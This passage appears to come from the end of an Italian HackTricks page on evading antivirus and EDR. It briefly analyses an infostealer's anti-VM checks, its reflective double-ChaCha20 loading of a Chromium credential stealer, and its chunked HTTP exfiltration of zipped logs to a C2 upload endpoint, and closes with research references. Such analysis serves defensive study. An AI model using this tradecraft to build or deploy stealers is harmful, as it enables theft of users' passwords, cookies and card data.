CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica `check_antivm` a più livelli

- La variante A scorre l'elenco dei processi, calcola l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B ispeziona le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali attorno agli sleep per individuare il single-stepping. Qualsiasi rilevamento interrompe l'esecuzione prima dell'avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un credential helper di Chromium che viene scritto su disco oppure mappato manualmente in memoria; la modalità fileless risolve autonomamente import e relocations, così non vengono scritti artefatti dell'helper.
- L'helper memorizza una DLL di secondo stadio crittografata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective tramite direct syscall per effettuare l'injection in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittografare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening di ABE.


### Raccolta modulare in memoria ed exfiltration HTTP a chunk

- `create_memory_based_log` itera su una tabella globale di function pointer `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e comunica il numero di file dopo una finestra di join di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` linkata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` esegue quindi uno sleep di 15 secondi e invia l'archivio in chunk da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary `multipart/form-data` del browser (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale, mentre l'ultimo chunk aggiunge `complete: true` per informare il C2 che la riassemblazione è terminata.

## References

- [1] [Tecniche avanzate di elusione: precision module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/injection di processi Windows](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack, nessun lasciapassare per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC con call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova infection chain e obfuscation basata su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei posture check di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con il supporto di Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Abbattere la protective shell di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento al comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittografia di Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: sconfiggere il malware Node.js con API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: mettere Adaptix a riposo con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET e Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento dello sleep di Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni di Red Team: guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: weaponization del remediation driver di Defender come primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice di accompagnamento MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creazione di funzioni self-masking con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
